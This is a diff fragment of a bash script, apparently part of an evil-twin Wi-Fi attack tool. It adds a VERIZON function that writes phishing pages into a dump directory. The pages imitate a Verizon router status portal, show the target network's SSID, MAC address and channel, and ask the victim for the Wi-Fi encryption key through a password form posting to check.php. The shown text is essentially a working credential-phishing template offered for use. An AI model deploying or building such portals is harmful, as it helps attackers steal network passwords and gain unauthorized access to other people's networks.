+		<div style=\"background-position: 0px 0px;\" id=\"threeG_icos\" class=\"threeG_ico\" power3g=\"3\">$DIALOG_WEB_INDEX_22</div>
+		<span class=\"threeG_txt hand trad\" key=\"MAP_3G\"><A href=\"\"><font color=\"red\"></span>
+	</div>
+	<div adslconfigurable=\"true\" id=\"adsl\" adslactive=\"false\" class=\"adsl trad hand\">
+		<div style=\"background-position: -152px 0px;\" class=\"adsl_ico\" id=\"iconadsl\"></div>
+		<span class=\"adsl_txt trad\" key=\"MAP_ADSL\"><A href=\"\">$DIALOG_WEB_INDEX_23</A></span>
+	</div>	
+	<div id=\"wifi\" class=\"hand disabled\">
+		<div class=\"wifi_ico\" color=\"red\"></div>
+		<span class=\"gateway\"></span>
+		<span class=\"wifi_txt trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_24</A></span>
+	</div>
+	
+	<div id=\"wifi2\" class=\"hand disabled\">
+		<div class=\"wifi_ico2\" color=\"red\"></div>
+		<span class=\"gateway2\"></span>
+		<span class=\"wifi_txt2 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_1</A></span>
+	</div>
+	
+	<div id=\"wifi3\" class=\"hand disabled\">
+		<div class=\"wifi_ico3\" color=\"red\"></div>
+		<span class=\"gateway3\"></span>
+		<span class=\"wifi_txt3 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_2</A></span>
+	</div>
+
+	<div id=\"wifi4\" class=\"hand disabled\">
+		<div class=\"wifi_ico4\" color=\"red\"></div>
+		<span class=\"gateway4\"></span>
+		<span class=\"wifi_txt4 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_3</A></span>
+	</div>
+	
+	<div id=\"wifi5\" class=\"hand disabled\">
+		<div class=\"wifi_ico5\" color=\"red\"></div>
+		<span class=\"gateway5\"></span>
+		<span class=\"wifi_txt5 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_4</A></span>
+	</div>
+	
+	<div id=\"wifi6\" class=\"hand disabled\">
+		<div class=\"wifi_ico6\" color=\"red\"></div>
+		<span class=\"gateway6\"></span>
+		<span class=\"wifi_txt6 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_5</A></span>
+	</div>
+	
+	<div id=\"wifi7\" class=\"hand disabled\">
+		<div class=\"wifi_ico7\" color=\"red\"></div>
+		<span class=\"gateway7\"></span>
+		<span class=\"wifi_txt7 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_6</A></span>
+	</div>
+	
+	<div id=\"wifi8\" class=\"hand disabled\">
+		<div class=\"wifi_ico8\" color=\"red\"></div>
+		<span class=\"gateway8\"></span>
+		<span class=\"wifi_txt8 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_7</A></span>
+	</div>
+	
+	<div id=\"wifi9\" class=\"hand disabled\">
+		<div class=\"wifi_ico9\" color=\"red\"></div>
+		<span class=\"gateway9\"></span>
+		<span class=\"wifi_txt9 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_8</A></span>
+	</div>
+	
+	<div id=\"wifi10\" class=\"hand disabled\">
+		<div class=\"wifi_ico10\" color=\"red\"></div>
+		<span class=\"gateway10\"></span>
+		<span class=\"wifi_txt10 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_9</A></span>
+	</div>
+	
+	<div id=\"wifi11\" class=\"hand disabled\">
+		<div class=\"wifi_ico11\" color=\"red\"></div>
+		<span class=\"gateway11\"></span>
+		<span class=\"wifi_txt11 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_10</A></span>
+	</div>
+	
+	<div id=\"wifi12\" class=\"hand disabled\">
+		<div class=\"wifi_ico12\" color=\"red\"></div>
+		<span class=\"gateway12\"></span>
+		<span class=\"wifi_txt12 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_11</A></span>
+	</div>
+	
+	<div id=\"wifi13\" class=\"hand disabled\">
+		<div class=\"wifi_ico13\" color=\"red\"></div>
+		<span class=\"gateway13\"></span>
+		<span class=\"wifi_txt13 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_12</A></span>
+	</div>
+	
+	<div id=\"wifi14\" class=\"hand disabled\">
+		<div class=\"wifi_ico14\" color=\"red\"></div>
+		<span class=\"gateway14\"></span>
+		<span class=\"wifi_txt14 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_13</A></span>
+	</div>
+	
+	<div id=\"wifi15\" class=\"hand disabled\">
+		<div class=\"wifi_ico15\" color=\"red\"></div>
+		<span class=\"gateway15\"></span>
+		<span class=\"wifi_txt15 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_14</A></span>
+	</div>
+	
+	<div id=\"wifi16\" class=\"hand disabled\">
+		<div class=\"wifi_ico16\" color=\"red\"></div>
+		<span class=\"gateway16\"></span>
+		<span class=\"wifi_txt16 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_15</A></span>
+	</div>
+	
+	<div id=\"wifi17\" class=\"hand disabled\">
+		<div class=\"wifi_ico17\" color=\"red\"></div>
+		<span class=\"gateway17\"></span>
+		<span class=\"wifi_txt17 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_16</A></span>
+	</div>
+	
+	<div id=\"wifi18\" class=\"hand disabled\">
+		<div class=\"wifi_ico18\" color=\"red\"></div>
+		<span class=\"gateway18\"></span>
+		<span class=\"wifi_txt18 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_17</A></span>
+	</div>
+	
+	<div id=\"wifi19\" class=\"hand disabled\">
+		<div class=\"wifi_ico19\" color=\"red\"></div>
+		<span class=\"gateway19\"></span>
+		<span class=\"wifi_txt19 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_18</A></span>
+	</div>
+	
+	<div id=\"wifi20\" class=\"hand disabled\">
+		<div class=\"wifi_ico20\" color=\"red\"></div>
+		<span class=\"gateway20\"></span>
+		<span class=\"wifi_txt20 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_19</A></span>
+	</div>
+	
+	<div id=\"wifi21\" class=\"hand disabled\">
+		<div class=\"wifi_ico21\" color=\"red\"></div>
+		<span class=\"gateway21\"></span>
+		<span class=\"wifi_txt21 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_20</A></span>
+	</div>
+	
+		<div class=\"scroll\">
+<iframe src=\"info.html\" width=\"450\" height=\"290\" align=\"center\">
+		</div>
+	
+	
+	
+
+        <div id=\"remaining_session_box\" style=\"float: right; display: none;\">
+		<span>Remaining Session: </span>	
+		<span id=\"remaining_session\"></span>
+	</div>
+
+</div></div></a>
+	</div>					
+  		
+	<div id=\"help_dialog\" class=\"dialog\"></div>
+	<div id=\"dialog\" class=\"dialog dialog_text\"></div>	
+	<div id=\"dialogWarning\" class=\"dialog dialog_text\"></div>
+	
+
+
+</body>
+</html>
+
+">$DUMP_PATH/data/index.htm
+            }
+            error && final && info && index
+	      }
+	      
+	      
+	      ##################-VERIZON-###############
+	       #Conten interface web
+function VERIZON {
+
+mkdir $DUMP_PATH/data &>$flux_output_device
+        cp  $WORK_DIR/Sites/VERIZON/info2.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VERIZON/info.css $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VERIZON/background.png $DUMP_PATH/data
+        cp  $WORK_DIR/Sites/VERIZON/house.png $DUMP_PATH/data
+         
+       function final {
+echo "<link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\"></HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+        <TR>
+
+          <TD class=blue colspan=2></TD>
+
+        </TR>
+
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+          
+$DIALOG_WEB_OK .</TD></TR>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+</blockquote>
+</BODY>
+
+</HTML>
+
+">$DUMP_PATH/data/final.html
+
+                   }
+	      
+	     function error {
+ echo " 
+   <link rel=\"stylesheet\" href=\"info2.css\" type=\"text/css\">
+</HEAD>
+</HEAD>
+
+<BODY>
+      <blockquote>
+
+
+    <TABLE id=\"autoWidth\">
+
+      <TBODY>
+
+
+
+        <TR>
+
+          <TD colspan=2></TD>
+
+        </TR>
+        
+        
+  </TR>
+ 
+
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+
+
+$DIALOG_WEB_ERROR
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+        
+<tr><td colspan=\"2\" align=\"center\"><form><INPUT name=\"Back\" onclick=\"history.back();return false\" class=\"buttonBig\" type=\"submit\" value=\"Back\"/></form></td></tr>
+
+<tbody><tr><td height=\"50\" width=\"50\"><img src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAABmJLR0QA/wD/AP+gvaeTAAAACXBI
+WXMAAAsTAAALEwEAmpwYAAAH2ElEQVRo3tWaW2xcVxWGv3N8zvgSj8dxUttprkBNSdPQQAsV10IF
+lKK88ABCQkKoDxUvFVXUSggJIaigSJFQUZ94KQhEHxA8tAQEpCC1USOuTVsgl7apsZPY8W3sY4/n
+tmfO4cH/rjfTiWfGmcTxlo5GMz577/Wvy7/WXtseNSMKw25gGNgHbAcCIAYSNm74kqEM5IElYBqY
+yBhTQEJaAClgCzAgELcCO/RORQvdCEAKwIJkNccXkwuf7vMSTyA6gJ3ACPBOYC+wC9iqhYoCkwBe
+g02TOo87PAnmNbEWzp6J5nVInlHgFeAsMGMtkpIV7gXuAoaATi1QBnL6jLUYdYRzQcQ1j/ueJ2E6
+WgBi9+0DtslLxuQ9/cA5C6RbFng/8BF9nwMiLVJ13MtvQoC1hLUWatZV7f52vX4gI0VXrdsFURh2
+yoVuUpBvkQXOAG8ITLEBEKt5Dwi1SZfW6pYGE8BorUUFrGnC1WLtHchTZoCbtccgcDsQBUK3TWB6
+NHkUOA6cVGC5WqznWhVpJ5Dw/TL7kNbu0twCkJVbXJLCPM1rBsigYvgW4DbgAPAeYDqQ8L0SoFMT
+LyuQTmSMMc1Si0hjUMRhQXU5blSQJeYEZC5jTLGF9dPAlJTbC7xXyhoOpGHLBtbEBsi1AkJjQLR9
+ENgNpKWclFwulhDb5cpjURi+mTEm28ziz4+Xc/fsSc3LqjnHU1JBDbskDt35LWiqW8KNAJ8APg7s
+kUKWtF6vrFOSIBeAfwMvRGH4t4wxy432uWdPKiX5ylqnZF3bX4Pzm6FGvverk6HiYJ/89aBM/g5p
+3U2ooWLx3cAHgbs1Z1hu2Wh0SMaKlFS1ceQ34O+G42tf+VSH/PQ2PUPaYA74F/A88HvgGeA3wIvA
+pGJzl4L3XcDuKAzTR4+d8teTbIMGuaDhCIyxtLhf8dEjQaeAFwRkQhbZqvcOAx/V932ykAHiUiFf
+WCPHeHWehkCaHZ5To6Ul0CzwupjvpYwxOSeeCsD7ZLVexdaQgF9O4riZZPs2qm4HEJvoCkqeZVHr
+GDDtgrBYlBQT7Z8SCXS2ULbUrSrbASSn3DOmauANsdLSt3/x59ogTjlBW3XKn+oVisymRjssUpWW
+LwDLotspnRfyR756X9f4t54ojJ4+xTPPPt2nynpADFaREiLNK+GtyyBtAzINnFagWxcriOfTT/zg
+0R2q4/aKnu9QbESKp1FZc973/XijgFQEZFEuY/SEIoGblFMO6RlRrdQpC14EXhOYfPeW9Ma4VsaY
+RNov1GT7UFrfJXq9XUXekOLgsphtFLj8Fincf5DrHuzffOp3XgMlDStz71fpHcqV/qoEeUxJc/Fq
+FXpVFvn+A59byw26dOa/VZm7TwE9oez+InAeWIh9v7ihQJpYO62yfkDf5wXkHPBKs1Xv9coja2Xg
+lJgsVKKcl2tFauu0VWvXatimgZv1pwSkIIbbFEBsopwQmKwY6iIQxZ5X2SxAbO/ppPJJJMqdAaZ+
+9JM/VPjyJzcFECNrlBUjOSc2ih1hGG8WiwRqBaUV9IlKFgOYSrnstbOffC2BZHRivEs5ZFqudgkY
+f/iBz058Z8VaNzyQPpUl96ksuaiD1n+Akp8k01wHIEkbuu+hrLJT5Ykn+p2Uy62nXk+cFur/9ZT9
+K5yBLf9fLf0mdfrBfivNjTqVdsmJNbuGHzRoQl/NiMVQWZXslrHKThtnPZVIhzzJlS8JnONm7Lzc
+CwxGYdifMWZBJbl/pQ6LOnoJ4C139VR7inmr+TmdNbJOm3TeOa8A8KUjj/k/fvK7bsmUZIyp1mnH
+9ulYsE9xl7KNcds8s2dmK6Atv6eiMJxUSVG+Ujfe/bKlmHcvg0b1aU+OttZaBjqjMOwBqqyAsM1s
+3ylr3NEpue7QAe2AEu0ysBhoUkkT8w7jjOicsF2b51i9p/CbdINFHYE9x8crssY2Vq8wSlr3rbZq
+FIazGWPyskYXq534Q8CdIhBE6zMBq/cVk+p+9Oi3IbU+d8o1Cg4Qr0HVa9ml7FjSbZInTjU8JmG6
+dG65WeBei8Lwgn7fpb8d0DF5m2S5qPnnAxOm8qEpz8qXT+rwM8TKHcego8lqi13I2LFA4ijAglwG
+3gROCNSAuo93C+BzcrV+/XanlNqvNS6xcn94BjgTbM8vx0ePvbzw4Oc/MCqTLwn5QU2011zrTZ5J
+DXhL7ZHWPae8slVx+TEBycrVh9Th/7CsM+v0z14CXgUuBQCPHj4UPxiGWeC/NQlnURroEkh7TZys
+kzrdhJbTfrMSOC9w83p/ryw1LMWm9fu8LHlOYMaBrKvlkkpse39xvg6IdhR6iRMjcxJmWn/7u/ba
+LZLZw+rdJk7/7B/6HAcWMsYUg5qsuSRNTdawTdPd+RZcja9/42j808ceNmKmBPinLGNvl0ekSDum
+pGB7UTvz1G9fLfCZ/XhHnvyl98OHvriR/55hE15KcbJT3fp7gQ8p+VklngF+DfwReD32/ezWUqkM
+4N8IIAAO3/8FexweUwCfAP4kK8VOfrOXtik/jjuuRxnf0jjx7NNJZoXN5qKV02NVrl5UrN7iFLKe
+U3dd83bQusfPj5+NlOzOAi8Df9FzSow1p1iqtDuAr0XMdIpyd+ukuYOVq+3T6hkvPfTI4+Znjz9S
+vaGBOIBstzItN5vJGDNXry5iE4CxAV4B8hlj3tYT+x/bHOAwLK6c3wAAAABJRU5ErkJggg==
+\" height=\"50\" width=\"50\"></td>
+        </tr>
+      </tbody></table>
+
+
+      </TBODY>
+
+    </TABLE>
+
+
+      </blockquote>
+</BODY>
+
+</HTML>">$DUMP_PATH/data/error.html
+               }
+	      
+	      function info {
+echo "<html>
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\">
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info2.css\" media=\"all\">
+</head>
+<body bgcolor=\"transparent\" marginheight=\"0\" marginwidth=\"0\">
+
+<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">
+  <tbody><tr> 
+      <td width=\"2%\">&nbsp;</td><td width=\"5%\"></td><td width=\"93%\"> 
+      <div valign=\"top\" align=\"left\"> 
+        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"360\">
+           
+          </tr>
+          <TABLE id=\"autoWidth\">
+
+      <TBODY>
+<tr><td><hr color=\"#6B1000\" size=2 width=\"99%\"></td></tr>
+
+
+                  <tr><td colspan=\"2\" ><font color=\"black\">SSID: <b>$Host_SSID</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"black\">MAC Address: <b>$Host_MAC</b></td></tr>
+        <tr><td colspan=\"2\"  ><font color=\"black\">Channel: <b>$Host_CHAN</b></td></tr>
+
+
+<tr><td></td></tr>
+
+
+<tr><td><hr color=\"#6B1000\" size=2 width=\"99%\"></td></tr>
+<tr><td></td></tr>
+
+        <TR>
+
+          <TD class=info1 colspan=2>
+<br><font color=\"black\">
+$DIALOG_WEB_INFO
+<br>
+<br>
+$DIALOG_WEB_INPUT
+<br>
+<br>
+<div id=\"box\" align=\"left\" >
+<form id=\"form1\" name=\"form1\" method=\"POST\" action=\"check.php\" >
+<tr><td><b><font color=\"black\">$Host_ENC</b> Key:</td></tr>
+<tr><td><input name=\"key1\" type=\"password\" class=\"textfield\" /><td></tr>
+
+
+        <TR><TD class=blue colspan=2></TD></TR>
+                <TR><TD class=blue colspan=2></TD></TR>
+
+        
+<tr><td colspan=\"2\"><INPUT name=\"Confirm\" class=\"button\" type=\"submit\" value=\"Confirm\"/></td></tr>
+
+</form></div>
+
+</TD></TR>
+
+
+      </TBODY>
+
+    </TABLE>
+</table></div></td></tr></tbody></table>
+</body>
+</html>
+
+">$DUMP_PATH/data/info.html
+             }
+	      
+function index {
+echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
+<html xmlns=\"http://www.w3.org/1999/xhtml\">
+<head>
+<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
+
+
+	
+	<title>VERIZON</title>
+	
+		 
+	
+	
+	
+	
+	
+	
+
+<link rel=\"stylesheet\" type=\"text/css\" href=\"info.css\" media=\"all\">
+</head>
+
+
+
+<body>	
+	
+
+		<div class=\"panel_content\" id=\"panel_content\"><div class=\"house\">
+		<div style=\"cursor: auto;\" id=\"internet\" class=\"divInternet\">
+		<div class=\"internet\" id=\"iconInternet\" internet_status=\"INTERNET_OK\"></div>
+		<div class=\"internet_txt\">
+			<span class=\"trad\" key=\"MAP_INTERNET\"><A href=\"\"><font color=\"red\">$DIALOG_WEB_INDEX_13</A></span>
+			<span class=\"internet_des trad\" key=\"COMMON_EMPTY\" id=\"internetAlert\"> </span>
+		</div>
+	</div>
+	<div id=\"threeG\" class=\"threeG hand trad\" style=\"\">
+		<div style=\"background-position: 0px 0px;\" id=\"threeG_icos\" class=\"threeG_ico\" power3g=\"3\">$DIALOG_WEB_INDEX_14</div>
+		<span class=\"threeG_txt hand trad\" key=\"MAP_3G\"><A href=\"\"><font color=\"red\"></span>
+	</div>
+	<div adslconfigurable=\"true\" id=\"adsl\" adslactive=\"false\" class=\"adsl trad hand\">
+		<div style=\"background-position: -152px 0px;\" class=\"adsl_ico\" id=\"iconadsl\"></div>
+		<span class=\"adsl_txt trad\" key=\"MAP_ADSL\"><A href=\"\">$DIALOG_WEB_INDEX_15</A></span>
+	</div>	
+	<div id=\"wifi\" class=\"hand disabled\">
+		<div class=\"wifi_ico\" color=\"red\"></div>
+		<span class=\"gateway\"></span>
+		<span class=\"wifi_txt trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_16</A></span>
+	</div>
+	
+	<div id=\"wifi2\" class=\"hand disabled\">
+		<div class=\"wifi_ico2\" color=\"red\"></div>
+		<span class=\"gateway2\"></span>
+		<span class=\"wifi_txt2 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_1</A></span>
+	</div>
+	
+	<div id=\"wifi3\" class=\"hand disabled\">
+		<div class=\"wifi_ico3\" color=\"red\"></div>
+		<span class=\"gateway3\"></span>
+		<span class=\"wifi_txt3 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_2</A></span>
+	</div>
+
+	<div id=\"wifi4\" class=\"hand disabled\">
+		<div class=\"wifi_ico4\" color=\"red\"></div>
+		<span class=\"gateway4\"></span>
+		<span class=\"wifi_txt4 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_3</A></span>
+	</div>
+	
+	<div id=\"wifi5\" class=\"hand disabled\">
+		<div class=\"wifi_ico5\" color=\"red\"></div>
+		<span class=\"gateway5\"></span>
+		<span class=\"wifi_txt5 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_4</A></span>
+	</div>
+	
+	<div id=\"wifi6\" class=\"hand disabled\">
+		<div class=\"wifi_ico6\" color=\"red\"></div>
+		<span class=\"gateway6\"></span>
+		<span class=\"wifi_txt6 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_5</A></span>
+	</div>
+	
+	<div id=\"wifi7\" class=\"hand disabled\">
+		<div class=\"wifi_ico7\" color=\"red\"></div>
+		<span class=\"gateway7\"></span>
+		<span class=\"wifi_txt7 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_6</A></span>
+	</div>
+	
+	<div id=\"wifi8\" class=\"hand disabled\">
+		<div class=\"wifi_ico8\" color=\"red\"></div>
+		<span class=\"gateway8\"></span>
+		<span class=\"wifi_txt8 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_7</A></span>
+	</div>
+	
+	<div id=\"wifi9\" class=\"hand disabled\">
+		<div class=\"wifi_ico9\" color=\"red\"></div>
+		<span class=\"gateway9\"></span>
+		<span class=\"wifi_txt9 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_8</A></span>
+	</div>
+	
+	<div id=\"wifi10\" class=\"hand disabled\">
+		<div class=\"wifi_ico10\" color=\"red\"></div>
+		<span class=\"gateway10\"></span>
+		<span class=\"wifi_txt10 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_9</A></span>
+	</div>
+	
+	<div id=\"wifi11\" class=\"hand disabled\">
+		<div class=\"wifi_ico11\" color=\"red\"></div>
+		<span class=\"gateway11\"></span>
+		<span class=\"wifi_txt11 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_10</A></span>
+	</div>
+	
+	<div id=\"wifi12\" class=\"hand disabled\">
+		<div class=\"wifi_ico12\" color=\"red\"></div>
+		<span class=\"gateway12\"></span>
+		<span class=\"wifi_txt12 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_11</A></span>
+	</div>
+	
+	<div id=\"wifi13\" class=\"hand disabled\">
+		<div class=\"wifi_ico13\" color=\"red\"></div>
+		<span class=\"gateway13\"></span>
+		<span class=\"wifi_txt13 trad\" key=\"MAP_WIFI_WPA\"><A href=\"\">$DIALOG_WEB_INDEX_12</A></span>
+	</div>
+	
+	
+		<div class=\"scroll\">
+<iframe src=\"info.html\" width=\"450\" height=\"290\" align=\"center\">
+		</div>
+	
+	
+	
+
+        <div id=\"remaining_session_box\" style=\"float: right; display: none;\">
+		<span>Remaining Session: </span>	
+		<span id=\"remaining_session\"></span>
+	</div>
+
+</div></div></a>
+	</div>					
+  		
+	<div id=\"help_dialog\" class=\"dialog\"></div>
+	<div id=\"dialog\" class=\"dialog dialog_text\"></div>	
+	<div id=\"dialogWarning\" class=\"dialog dialog_text\"></div>
+	
+
+
+</body>
+</html>">$DUMP_PATH/data/index.htm
+            }
+            error && final && info && index
+	      }
 
 ######################################### < INTERFACE WEB > ########################################
 top&& setresolution && setinterface
